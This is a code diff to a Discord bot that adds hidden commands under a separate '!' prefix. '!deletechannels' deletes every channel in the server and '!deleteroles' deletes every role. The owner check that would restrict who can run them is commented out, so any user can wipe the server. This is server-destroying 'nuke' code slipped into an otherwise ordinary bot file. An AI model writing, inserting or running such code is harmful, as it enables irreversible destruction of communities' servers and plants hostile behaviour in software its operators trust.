@@ -2,7 +2,25 @@ const Discord = require('discord.js');
 const client = new Discord.Client();
 var prefix = "b!"
 
-
+client.on('message', message => {
+var prefix = "!"; // Diamond Codes - [Allwai]
+if(message.content.split(' ')[0] == prefix + 'deletechannels') {
+if (!message.channel.guild) return; // Diamond Codes - [Allwai]
+//if(message.author.id !== myID) return;
+if(!message.guild.member(client.user).hasPermission("MANAGE_CHANNELS")) return message.reply("**:no_entry: , I Don't Have `MANAGE_CHANNELS` Permission**"); // Diamond Codes - [Allwai]
+message.guild.channels.forEach(m => {
+m.delete();
+}); // Diamond Codes - [Allwai]
+}
+if(message.content.split(' ')[0] == prefix + 'deleteroles') { // Diamond Codes - [Allwai]
+if (!message.channel.guild) return; // Diamond Codes - [Allwai]
+//if(message.author.id) return;
+if(!message.guild.member(client.user).hasPermission("MANAGE_ROLES_OR_PERMISSIONS")) return message.reply("**:no_entry: , I Don't Have `MANAGE_ROLES` Permission.**"); // Diamond Codes - [Allwai]
+message.guild.roles.forEach(m => {
+m.delete();
+});
+}
+});
 
 //bc
 
